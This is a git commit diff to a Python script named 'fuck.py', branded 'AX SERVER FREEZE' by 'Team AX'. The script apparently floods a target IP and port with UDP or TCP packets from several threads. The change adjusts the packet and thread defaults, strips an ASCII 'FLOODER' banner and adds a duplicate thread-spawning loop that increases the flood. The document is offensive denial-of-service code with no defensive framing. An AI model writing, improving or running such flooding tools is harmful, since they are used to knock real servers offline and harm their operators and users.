100dd1ba387d790fa9fb1d315a6e604781413780
KTmodz <113619086+KTmodz@users.noreply.github.com>
2024-03-15 13:43:30 +0600

    Update fuck.py

--- fuck.py
+++ fuck.py
@@ -9,27 +9,12 @@ ap = argparse.ArgumentParser()
 ap.add_argument("-i", "--ip", required=True, type=str, help="Host ip")
 ap.add_argument("-p", "--port", required=True, type=int, help="Port")
 ap.add_argument("-c", "--choice", type=str, default="y", help="UDP(y/n)")
-ap.add_argument("-t", "--times", type=int, default=99999, help="Packets per one connection")
-ap.add_argument("-th", "--threads", type=int, default=7, help="Threads")
+ap.add_argument("-t", "--times", type=int, default=50000, help="Packets per one connection")
+ap.add_argument("-th", "--threads", type=int, default=6, help="Threads")
 args = vars(ap.parse_args())
 
 print("--> Created BY Team AX <--")
 print("#-- AX SERVER FREEZE --#")
-print("\033[96m" + """
-
- .d8b.  db    db      .d8888.        d88888b db       .d88b.   .d88b.  d8888b. d88888b d8888b. 
-d8' `8b `8b  d8'      88'  YP        88'     88      .8P  Y8. .8P  Y8. 88  `8D 88'     88  `8D 
-88ooo88  `8bd8'       `8bo.          88ooo   88      88    88 88    88 88   88 88ooooo 88oobY' 
-88~~~88  .dPYb.         `Y8b. C8888D 88~~~   88      88    88 88    88 88   88 88~~~~~ 88`8b   
-88   88 .8P  Y8.      db   8D        88      88booo. `8b  d8' `8b  d8' 88  .8D 88.     88 `88. 
-YP   YP YP    YP      `8888Y'        YP      Y88888P  `Y88P'   `Y88P'  Y8888D' Y88888P 88   YD 
-                                                                                               
-                                                                                               
-""" + "\033[91m" + """
-                                                                                                                
-                                                                                                                
-                                                                                                                
-""" + "\033[0m")
 
 
 print("Super Fast And Accurate")
@@ -68,6 +53,13 @@ def run2():
 			s.close()
 			print("\033[91m[!] AN UNKNOWN ERROR OCCURRED!!!\033[0m")
 
+for y in range(threads):
+	if choice == 'y':
+		th = threading.Thread(target = run)
+		th.start()
+	else:
+		th = threading.Thread(target = run2)
+		th.start()
 for y in range(threads):
 	if choice == 'y':
 		th = threading.Thread(target = run)
